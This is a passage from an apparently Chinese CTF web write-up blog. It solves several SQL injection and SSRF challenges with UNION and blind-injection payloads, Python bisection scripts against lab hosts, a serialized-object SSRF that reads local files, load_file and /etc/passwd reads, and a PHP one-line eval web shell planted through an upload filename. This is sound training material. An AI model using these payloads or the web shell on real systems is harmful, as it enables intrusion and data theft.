curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一眼看上去就很像是SSRF漏洞利用，但是始终绕不过<code>isValidBlog</code>函数中的正则表达式</p>
<p>走一下网站的流程</p>
<p>注册了账号</p>
<p>访问个人界面时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:53095&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>
<p>输入no=9</p>
<p>有报错信息，泄露了目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Notice: Trying to get property of non-object in &#x2F;var&#x2F;www&#x2F;html&#x2F;view.php on line 53</span><br></pre></td></tr></table></figure>
<p>看一下有没有sql注入，手工注失败了，有waf。</p>
<p>看了一下师傅们的wp,发现是waf把union select给过滤了，用/**/内联注释来绕过。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620150734.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#爆表</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database() </span><br><span class="line">#爆列</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema&#x3D;database()</span><br><span class="line">#爆列data的内容</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(data),3,4 from users</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620151058.png" alt=""></p>
<p>data里的内容就是我们之前注册用户的序列化数据，报错信息暗示我们需要构造一个序列化对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unserialize(): Error at offset 0 of 1 bytes in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php&lt;&#x2F;b&gt; on line 31</span><br></pre></td></tr></table></figure>
<p>这里提交了一个no的参数，返回了用户信息这个页面，所以不难猜到服务器端是通过分析no参数，再从数据库中进行查询，然后返回我们的信息，之前sql注入时得到了服务器再查询时是查询了4个字段，而我们得到的可用的字段有[no,username,passwd,data]四个字段。</p>
<p>毋庸置疑的是我们的注册信息是写入了数据库的，而no,username,passwd三个字段均没有我们注册时候填写的blog地址，只有data字段中有一个序列化后的blog属性的值。那么返回的页面中的bolg地址是怎么查询的? 或者说怎么得到的？就是通过查询data字段,得到其中的序列化信息来渲染整个页面，从而恰好得到页面中的username,age,blog值。</p>
<p>猜想到这个逻辑之后,我们就可以通过修改查询的序列化对象的值来构造ssrf请求,从而读取到flag文件</p>
<p>利用前面泄露的源码构造一个恶意对象</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">233</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="keyword">new</span> UserInfo();</span><br><span class="line"><span class="keyword">echo</span> serialize($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用getBlogContents调用的curl进行SSRF攻击，四个参数都试了一下，发现是第4个用来读用户数据的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>在iframe中得到flag。</p>
<h3 id="非预期解">非预期解</h3>
<p>源码没有过滤load_file函数，可以直接包含一个文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;0+unIon&#x2F;**&#x2F;select+1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),1,1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>load_file使用条件：</p>
<p>1.用户有很高的权限</p>
<p>2.知道文件的绝对路径</p>
</blockquote>
<h2 id="BJDCTF-2nd-简单注入">BJDCTF 2nd 简单注入</h2>
<h3 id="考点-v13">考点</h3>
<ul>
<li>MySQL盲注</li>
<li>Python脚本编写</li>
</ul>
<h3 id="解题-v12">解题</h3>
<p>访问<code>robots.txt</code>页面提示有<code>hint.php</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br></pre></td></tr></table></figure>
<p>fuzz一下发现：空格单双引号过滤，\没过滤，如果未对<code>$_POST[&quot;username&quot;]</code>进行其他限制，那么可以使用反斜杠将第二个单引号转义，此时第一个单引号和第三个单引号构成语句：<code>username='xxxxx', $_POST[&quot;password&quot;]</code>则可进行盲注。</p>
<p><code>username=admin\  password=or/**/length(database())&gt;0#</code>回显<code>BJD needs to be stronger</code></p>
<p><code>username=admin\  password=or/**/length(database())&lt;0#</code>回显<code>You konw ,P3rh4ps needs a girl friend</code></p>
<p>写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2cfb1e37-5400-4888-895d-bd5db365a250.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">&#x27;BJD needs to be stronger&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)</span><br><span class="line">        data[<span class="string">&#x27;password&#x27;</span>] = payload</span><br><span class="line"></span><br><span class="line">        rs = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> rs.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>得到<code>password:OhyOuFOuNdit</code></p>
<h2 id="SWPUCTF2019-Web1">SWPUCTF2019 Web1</h2>
<h3 id="考点-v14">考点</h3>
<ul>
<li>二次注入</li>
<li>MySQL无列名注入</li>
<li>MySQL5.7+ 新特性</li>
</ul>
<h3 id="知识储备">知识储备</h3>
<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在CTF题目中常常是因为information_schema被过滤的情况下，使用这种方法获取列名。</p>
<p>无列名注入的原理其实类似于将我们不知道的列名，进行取别名操作，在取别名的同时进行数据查询，所以如果我们查询的字段多于数据表中列的时候，会出现报错。</p>
<blockquote>
<p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 5.7以上，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p>
</blockquote>
<p>例如当前有一个user表</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702211931.png" style="zoom:67%;" />
<p>发现该数据表中有3列，我们使用无列名查询的方式尝试查询一下</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212049.png" style="zoom:67%;" />
<p>尝试多一个字段或者少一个字段进行查询：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212208.png" style="zoom:67%;" />
<p>仍然报错，证明无列名注入必须一一对应所查询数据表的列数。</p>
<p>对一列数据进行查询：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212534.png" style="zoom:67%;" />
<blockquote>
<p>末尾的 a 可以是任意字符，用于命名。</p>
</blockquote>
<p>当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702213855.png" style="zoom:67%;" />
<p>同时查询多个列：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702214129.png" style="zoom:67%;" />
<h3 id="解题-v13">解题</h3>
<p>注册admin的时候提示用户已经存在，那么就随便注册一个用户名，登录后发表广告，点击查看详情页，第一反应看url传入了id字段，经过测试后，id字段不存在SQL注入。</p>
<p>再考虑是不是二次注入，发表广告后，查询广告详情的时候产生注入。</p>
<p>测试注入点：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702215827.png" alt=""></p>
<p>点击广告详情</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702215848.png" alt=""></p>
<p>发现数据库报错信息，证明存在注入，可根据报错的信息去构造sql注入语句，fuzz一下被过滤的字符和符号。</p>
<p>发现空格，or，#，–+等被过滤，我们使用注释符号来代替空格。报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</p>
<p>尝试闭合单引号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaa&#39;,&#39;</span><br></pre></td></tr></table></figure>
<p>先判断字段的个数，or被过滤了不能用order by，但是可以用group by来替换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;</span><br></pre></td></tr></table></figure>
<p>判断回显位</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703100141.png" alt=""></p>
<p>查询一下数据库名称和版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703101346.png" alt=""></p>
<p>由于or被过滤，所以不能用information_schema，但是根据上面的知识储备，如果数据表的引擎是<code>innodb</code>， 还可以用<code>mysql.innodb_table_stats</code>获取表名</p>
<blockquote>
<p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703102458.png" alt=""></p>
<p>我们无法知道列名，可以通过无列名注入的方式进行注入，先查询users表。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703103327.png" alt=""></p>
<h3 id="后记">后记</h3>
<p>如果过滤了逗号，可以用join关键字连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h2 id="网鼎杯2018-comment">网鼎杯2018 comment</h2>
<h3 id="考点-v15">考点</h3>
<ul>
<li>Git源码恢复</li>
<li>代码审计</li>
<li>二次注入</li>
</ul>
<h3 id="解题-v14">解题</h3>
<p>上来没什么思路，先用dirmap扫一遍发现Git文件夹，用GitHack把源码dump下来，只有一个<code>write_do.php</code>文件，并且不完整，需要查看提交历史。因为lijiejie的GitHack不能把.git文件夹同时dump下来，所以这里换成wangyihang的GitHacker。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705112838.png" alt=""></p>
<p>查看第一个commit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">HEAD 现在位于 e5b2a24 WIP on master: bfbdf21 add write_do.php</span><br></pre></td></tr></table></figure>
<p>得到<code>write_do.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>提交评论还需要登录，根据登录框上的place_hold，应该是要爆破密码的后三位，写一个python脚本跑一下就出来，代码写太烂不贴了：<code>zhangwei/zhangwei666</code></p>
<p>接着审计源码，可以看到上面第12-14行都对 POST 传来category 、 title 、content三个参数进行了特殊字符转义，然而在第28行和第30-33行处直接将从数据库中取出的数据，未经任何过滤拼接到SQL语句 中，并且content的值会显示在页面上，这就存在二次注入 。</p>
<blockquote>
<p>addslashes会将传入的信息都会进行转义，但是数据库会自动清除反斜杠。</p>
</blockquote>
<p>下面说说二次注入的攻击过程：</p>
<ul>
<li>
<p>先进入 write 方法，将payload： <code>',content=database(),/*</code> 插入 board 表的 category 字段中</p>
<p>此时payload为<code>title=111&amp;category=',content=database(),/*&amp;content=1</code></p>
</li>
<li>
<p>再进入 comment 方法，程序将 board 表中的 category 字段取出，没进行过滤，拼接到新的 insert 语句中。由于我们之前的 payload 中带有 /* ，所以我们需要闭合它，即我们在评论处提交 <code>*/#</code> (对应 content 变量的值)，用于闭合<code>/*</code></p>
</li>
<li>
<p>然后程序执行第二个SQL语句，并将用户提交的content值显示出来，而我们的 payload ： <code>',content=user(),/*</code> 就会显示出当前用户。</p>
</li>
</ul>
<p>查看当前用户</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143030.png" style="zoom:50%;" />
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143103.png" style="zoom:50%;" />
<blockquote>
<p>如果是root用户，一般 <strong>flag</strong> 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有。</p>
</blockquote>
<p>应该是要用SQL语句读取flag文件了。</p>
<p>先用<code>/etc/passwd</code>做一个验证</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143339.png" style="zoom: 50%;" />
<p>有一个www用户，查看他的历史命令</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143628.png" style="zoom:50%;" />
<p>可以发现他删除了一个<code>.DS_Store</code>文件，但是还存在于<code>/tmp/html</code>目录中，由于这个文件有很多不可见字符不能直接用编辑器打开，先对其进行16进制编码</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705144029.png" alt=""></p>
<p>再转换成ASCII</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705145015.png" alt=""></p>
<p>flag文件名<code>flag_8946e1ff1ee3e40f.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705145339.png" alt=""></p>
<p>再解码就可以得到flag。</p>
<h2 id="CISCN2019-easyweb">CISCN2019 easyweb</h2>
<h3 id="考点-v16">考点</h3>
<ul>
<li>源码泄露</li>
<li>MySQL盲注</li>
<li>PHP短标签</li>
</ul>
<h3 id="解题-v15">解题</h3>
<p>又是一道盲注的题目，还是没有做出来。。。。。</p>
<p><code>robots.txt</code>提示有bak备份文件，尝试了<code>index.php.bak</code>和<code>user.php.bak</code>无果后用dirmap扫描，发现了<code>image.php.bak</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
<p>基本思路：<strong>bool盲注，语句成功的话，就让id = 1，回显正常，错误的话 id = 0，就什么都没有</strong>。</p>
<p>单引号逃逸的方法是用<code>\0</code>来转义掉它的单引号。输入<code>\0</code>，经过<code>addslashes</code>函数会先变成<code>\\0</code>,然后经过“str_replace”函数，会变成<code>\</code>,这样，就把id后面的单引号给转义了。</p>
<p>SQL盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://143e2c2b-3448-4468-aeee-95cd35c73be0.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">payload = <span class="string">&quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">flag = <span class="string">&quot;JFIF&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        response = requests.get(url + payload.format(i, mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>登录后是一个文件上传的功能，经过测试后可以发现，<code>upload.php</code>把上传的文件名写入了一个php文件后缀的日志文件，并且路径已知。但是文件名会过滤php，可以用短标签绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>然后蚁剑直接连接。</p>
<h2 id="WUSTCTF2020-颜值成绩查询">WUSTCTF2020 颜值成绩查询</h2>
<h3 id="考点-v17">考点</h3>
<ul>
<li>MySQL盲注</li>
</ul>
<h3 id="解题-v16">解题</h3>
<p>比较明显的GET型的SQL注入，FUZZ一下</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708105750.png" style="zoom:50%;" />
<p>发现好像是可以直接执行SQL语句，验证一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708105954.png" alt=""></p>
<p>接下来就是直接写盲注脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a55db98c-72b1-40e8-b771-61b1bc60cd9d.node3.buuoj.cn/?stunum=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Hi admin, your score is: 100&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = 